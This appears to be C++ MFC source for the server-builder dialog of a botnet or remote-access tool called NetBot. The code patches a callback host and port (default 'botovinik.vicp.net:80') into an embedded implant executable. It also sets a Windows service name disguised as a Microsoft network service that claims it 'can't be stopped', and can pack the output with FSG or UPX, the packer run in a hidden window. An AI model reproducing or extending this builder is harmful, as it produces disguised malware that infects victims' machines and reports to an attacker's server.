// ServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "ServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

struct MODIFY_DATA
{
    char  strIPFile[128];   //ip文件or DNS						0
	char  strVersion[16];   //服务端版本						128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
	char  strSvrName[32];   //服务名称							149
	char  strSvrDisp[100];  //服务显示							181
	char  strSvrDesc[100];  //服务描述							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
}modify_data =
{
    "botovinik.vicp.net:80",
	"150628",
	vipid,
	FALSE,
	"WinNetCenter",
	"Microsoft(R) Multi Protocol Network Control Center",
	"Provides supports for multi network Protocol. This service can't be stopped.",
	"127.0.0.1",
	80,
};

/////////////////////////////////////////////////////////////////////////////
// CServerDlg dialog

CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServerDlg)
	m_Url = _T("127.0.0.1");
	m_ServiceName = _T("WinNetCenter");
	m_ServiceDisp = _T("MS Multi Protocal Network Control Center");
	m_ServiceDesc = _T("Provides support for multi network protocal . This service can't be stoped.");
	m_port = _T("80");
	//}}AFX_DATA_INIT
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServerDlg)
	DDX_Control(pDX, IDC_SVRLOG_LIST, m_LogList);
	DDX_Control(pDX, IDC_SERVERPROGRESS, m_ServerProgress);
	DDX_Text(pDX, IDC_URL, m_Url);
	DDX_Text(pDX, IDC_EDIT_NAME, m_ServiceName);
	DDX_Text(pDX, IDC_EDIT_DISP, m_ServiceDisp);
	DDX_Text(pDX, IDC_EDIT_DESC, m_ServiceDesc);
	DDX_Text(pDX, IDC_EDIT_PORT, m_port);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CServerDlg, CDialog)
	//{{AFX_MSG_MAP(CServerDlg)
	ON_BN_CLICKED(IDC_OK, OnOk)
	//}}AFX_MSG_MAP
	ON_COMMAND_RANGE(IDC_RADIO1,IDC_RADIO3,OnCompressType)
	ON_COMMAND_RANGE(IDC_RADIO4,IDC_RADIO5,OnRelpaceService)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerDlg message handlers 
void CServerDlg::ReadIniFile()
{
	char Path[255];
    GetCurrentDirectory(255, Path);
	CString path;
	path.Format("%s\\NetBot.ini", Path);
	if(m_Ini.SetPath(path))
	{
		m_Url = m_Ini.GetKeyValue("Server Setting", "IPFile");
	}
}

void CServerDlg::OnCompressType(UINT nID)
{
	switch(nID)
	{
	case IDC_RADIO1:
		CompressType = 1;
		break;
	case IDC_RADIO2:
		CompressType = 2;
		break;
	case IDC_RADIO3:
		CompressType = 3;
	    break;
	default:
		CompressType = 3;
	    break;
	}
}

void CServerDlg::OnRelpaceService(UINT nID)
{

}

BOOL CServerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_SERVER), FALSE);
	CenterWindow();

	ReadIniFile();

	// TODO: Add extra initialization here
	CompressType = 3;
	
	((CButton *)GetDlgItem(IDC_RADIO3))->SetCheck(TRUE);//选上

	CComboBox* pUrl = (CComboBox*)GetDlgItem(IDC_URL);

	pUrl->AddString("botovinik.vicp.net");
	pUrl->AddString("192.168.1.145");

	return TRUE;
}

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int len,i;   
	
	if (isizeSub == 0) 
	{
		len = lstrlen(strSub);  
	}		 
	else 
	{
		len = isizeSub;
	}

	for (i = 0; i < iSizeMem; i++)   
	{   
		if(memcmp(strSub, strMem+i, len) == 0)
		{
			return i;
		}	
	}  
	
	return -1;   
}

int LoadRes(LPBYTE *Mem, DWORD id)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	
	hResInfo = FindResource(NULL,MAKEINTRESOURCE(id),"EXE");
	if(hResInfo == NULL)
	{
		Msg("Can't Find Resource.");
		return -1;
	}
	
	dwSize = SizeofResource(NULL,hResInfo);
	
	hResData = LoadResource(NULL,hResInfo);
	if(hResData == NULL)
	{
		Msg("Can't Load Resource.");
		return -1;
	}
	
	*Mem = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
	if (*Mem == NULL)    
	{
		Msg("Can't Allocate Memory.");
		return -1;
	}
	
	CopyMemory((LPVOID)*Mem, (LPCVOID)LockResource(hResData), dwSize);

	return dwSize;
}

int ResToFile(char Path[], DWORD id)
{
	LPBYTE p;
	HANDLE hFile;
	DWORD dwSize,dwWritten;

	dwSize = LoadRes(&p, id);
	
	DeleteFile(Path);
	hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if(hFile == NULL)
	{
		GlobalFree(p);
		Msg("Can't Write file.");

		return 1;
	}
	
	WriteFile(hFile, (LPVOID)p, dwSize, &dwWritten, NULL);
	CloseHandle(hFile);
	GlobalFree(p);

	return 0;
}

int CServerDlg::Compress(char File[], DWORD id)
{
    char PackerPath[256];
    GetCurrentDirectory(256, PackerPath);
	lstrcat(PackerPath, File);
	DeleteFile(PackerPath);
	
	ResToFile(PackerPath, id);
	
	HANDLE hfsg = ShellExecute(this->m_hWnd, "open", PackerPath, Path , "", SW_HIDE);
	
	WaitForSingleObject(hfsg,2000);
	
	TerminateProcess(hfsg,0);
	
	return DeleteFile(PackerPath);
}

void CServerDlg::CompressFsg()
{
    Compress("\\fsg.exe", IDR_FSG);
}

void CServerDlg::CompressUpx()
{
    Compress("\\upx.exe", IDR_UPX);
}

//////////////////////////////////////////////////////////////////////////////////////////////

void CServerDlg::OnOk() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if(m_Url.GetLength() < 2 || m_Url.GetLength() > 100)
	{
		m_LogList.InsertString(0, "提示:配置信息填写错误!");
		return;
	}
	else
	{
		SYSTEMTIME localTime;
		GetLocalTime(&localTime);
		wsprintf(modify_data.strVersion,"%d%02d%02d", localTime.wYear, localTime.wMonth, localTime.wDay);
		lstrcpy(modify_data.strIPFile, m_Url);
		modify_data.dwVipID = ((CNetBotApp*)AfxGetApp())->VipID;

		lstrcpy(modify_data.ServerAddr, m_Url);
		modify_data.ServerPort = atoi(m_port);

		lstrcpy(modify_data.strSvrName,m_ServiceName);
		lstrcpy(modify_data.strSvrDisp,m_ServiceDisp);
		lstrcpy(modify_data.strSvrDesc,m_ServiceDesc);		
	}

	m_LogList.ResetContent();

	GetDlgItem(IDC_CREATE)->EnableWindow(FALSE);

	char dir[256];	
	GetCurrentDirectory(256, dir);
	
	CFileDialog fdlg(FALSE, ".exe", "nbs.exe", OFN_OVERWRITEPROMPT|OFN_EXPLORER|OFN_NOCHANGEDIR, "Executive Files (*.exe)|*.exe|All Files (*.*)|*.*||", this); 
	
	fdlg.m_ofn.lpstrInitialDir = dir;
	
	if(IDOK != fdlg.DoModal()) //broken down here
	{
		return;
	}

	CString sz = fdlg.GetPathName();
	if(sz == "" )
	{
		return;
	}
	lstrcpy(Path, sz);

	DWORD dwSize, dwWritten;
	LPBYTE p;
	HANDLE hFile;
	
	m_LogList.AddString("Load Resource...");

	dwSize = LoadRes(&p, IDR_EXE);

	int iPos = MemFindStr((const char *)p, "botovinik.vicp.net:80", dwSize, lstrlen("botovinik.vicp.net:80"));

	if(iPos == 0)
	{
		MessageBoxEx(NULL, "服务端读取错误!", "Setup Server", 0, 0); 
	}

	CopyMemory((LPVOID)(p + iPos), (LPCVOID)&modify_data, sizeof(MODIFY_DATA)); //填充配置信息

	m_LogList.AddString("Writing Config...");

	DeleteFile(Path);
	hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if(hFile == NULL)
	{
		return;
	}

	m_LogList.AddString("Writing File...");
	
	WriteFile(hFile, (LPVOID)p, dwSize, &dwWritten, NULL);

	if(hFile)
	{
		CloseHandle(hFile);
	}

	if(p)
	{
		GlobalFree(p);
	}
	
	switch(CompressType)
	{
		case 1:
			m_LogList.AddString("Compressing...");
			CompressFsg();
			break;
		case 2:
			m_LogList.AddString("Compressing...");
			CompressUpx();
			break;
		case 3:
			break;
		default:
			break;
	}
	
	m_LogList.AddString("Server Setup finished!");
	m_ServerProgress.SetPos(100);

	MessageBoxEx(NULL, "服务端生成完毕!", "配服务端", 0, 0); 
	
	GetDlgItem(IDC_CREATE)->EnableWindow(TRUE); 	

	UpdateData(FALSE);	
	m_Ini.SetKeyValue("Server Setting", "IPFile", m_Url);

	CDialog::OnOK();
}

